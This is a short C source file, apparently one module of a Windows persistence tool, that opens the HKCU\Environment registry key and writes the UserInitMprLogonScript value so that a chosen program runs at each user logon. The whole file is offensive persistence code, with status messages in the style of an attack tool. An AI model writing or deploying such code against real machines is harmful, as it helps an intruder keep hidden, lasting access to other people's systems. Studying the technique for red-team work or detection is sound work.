#include "persys.h"

void		LogonScript(S_args* params)
{
	HKEY hKey;

	printf("[*] Starting LogonScript module...\n");
	if (RegOpenKeyExW(HKEY_CURRENT_USER,
		L"Environment",
		0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		setRegVal(params, &hKey, L"UserInitMprLogonScript");
	else
		fprintf(stderr, "Error : opening 'HKCU\\Environment' key\n");
}